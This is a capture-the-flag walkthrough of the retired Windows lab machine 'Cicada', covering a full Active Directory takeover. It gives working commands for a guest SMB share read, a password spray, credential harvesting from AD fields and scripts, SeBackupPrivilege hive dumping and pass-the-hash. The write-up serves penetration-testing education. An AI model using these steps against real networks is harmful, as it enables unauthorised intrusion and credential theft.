## Overview

![Cicada](/images/writeups/cicada/logo.png)

| Field | Details |
|---|---|
| **Machine** | Cicada |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Status** | Retired |

## TL;DR

- Anonymous SMB access to HR share → default password in `Notice from HR.txt`
- `impacket-lookupsid` to enumerate AD users → password spray hits `michael.wrightson`
- AD description field leaks `david.orelious` credentials
- David's DEV share contains `Backup_script.ps1` with `emily.oscars` credentials
- Evil-WinRM as Emily → `SeBackupPrivilege` → dump SAM + SYSTEM hives → Administrator NTLM
- Pass-the-hash via Evil-WinRM → root

## Tools Used

- nmap, crackmapexec, smbclient, impacket-lookupsid, impacket-secretsdump, evil-winrm

echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts

## Enumeration

### SMB: Anonymous Access

Try without credentials first:

```bash
crackmapexec smb cicada.htb --shares
```

![Anonymous SMB: access denied](/images/writeups/cicada/1.png)

Denied. Try guest:

```bash
crackmapexec smb cicada.htb -u guest -p '' --shares
```

![Guest login: HR share readable](/images/writeups/cicada/2.png)

Guest has READ on `HR`. Connect with smbclient:

```bash
smbclient //cicada.htb/HR
```

```
smb: \> dir
```

![HR share contents](/images/writeups/cicada/3.png)

There's a `Notice from HR.txt`. Download it:

```bash
get "Notice from HR.txt"
```

Contents reveal the default onboarding password:

```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our
security protocols, it's essential that you change your default password to something
unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account using the provided username and the default
   password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password. Make sure your new password is strong,
   containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do
not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate
to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Password found: `Cicada$M6Corpb*@Lp#nZp!8`

### AD User Enumeration

We have a password, but no users. We can't apply the password to anyone yet. A useful tool called `lookupsid` will try to brute force the **Windows Security Identifiers** (SIDs) of any users in the domain. Each user has a unique SID. To enumerate the domain, we specify the guest user and `-no-pass` because we have no password:

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
```

![lookupsid output](/images/writeups/cicada/4.png)

That's a lot of output. At the bottom we can already see some users, but to make sure we have all of them, we run it again and filter to only `SidTypeUser` entries, then strip everything except the usernames with `sed`, and pipe into `users.txt`:

Filter to just user accounts and save:

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass \
  | grep 'SidTypeUser' \
  | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```

![users.txt created](/images/writeups/cicada/5.png)

### Password Spray

Spray the default password against every user:

```bash
crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![Password spray: michael.wrightson hits](/images/writeups/cicada/6.png)

`michael.wrightson` never changed the default password.

### Enumerate as Michael

Check Michael's share access:

![Michael has no extra share access](/images/writeups/cicada/7.png)

No new shares. But we can use his credentials to enumerate all users and their AD attributes:

```bash
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

![AD users: david.orelious has password in description](/images/writeups/cicada/8.png)

`david.orelious` has his password stored in the AD description field: `aRt$Lp#7t*VQ!3`

---

## Exploit

### David's DEV Share

Check what David can access:

```bash
crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![David has READ on DEV share](/images/writeups/cicada/9.png)

Connect and list:

```bash
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```

![DEV share: Backup_script.ps1 found](/images/writeups/cicada/10.png)

Download the script:

```bash
get Backup_script.ps1
```

Inside the full script:

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

Emily's credentials are hardcoded in the script, a classic mistake when automation scripts are left in shared locations.

### WinRM as Emily

Confirm Emily has `ADMIN$` access:

```bash
crackmapexec smb cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' --shares
```

![Emily: ADMIN$ access confirmed](/images/writeups/cicada/11.png)

Log in via WinRM:

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
```

![Evil-WinRM shell as Emily](/images/writeups/cicada/12.png)

```
cd ..\Desktop
cat user.txt
```

![user.txt captured](/images/writeups/cicada/userflag.png)

---

## Privilege Escalation: SeBackupPrivilege

```bash
whoami /priv
```

![SeBackupPrivilege enabled](/images/writeups/cicada/priv.png)

`SeBackupPrivilege` lets you read any file on the system, bypassing ACLs, including the SAM and SYSTEM registry hives which contain local password hashes.

```powershell
reg save hklm\sam sam
reg save hklm\system system
download sam
download system
```

![SAM and SYSTEM downloaded](/images/writeups/cicada/13.png)

Back on your machine, extract hashes:

```bash
impacket-secretsdump -sam sam -system system local
```

```
[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620

[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

A lot of information, but we only want the `Administrator` NTLM hash. That's the last segment of the line: `2b87e7c93a3e8a0ea4a581937016f341`

### Pass-the-Hash

```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

## Lessons Learned

- Always try anonymous and guest SMB access, HR shares often hold sensitive onboarding docs
- AD description fields are frequently abused for credential storage, always enumerate with `--users`
- Default passwords stick: spray them against all users, not just the one they were issued to
- `SeBackupPrivilege` is a direct path to NTLM hashes via SAM/SYSTEM, treat it like local admin
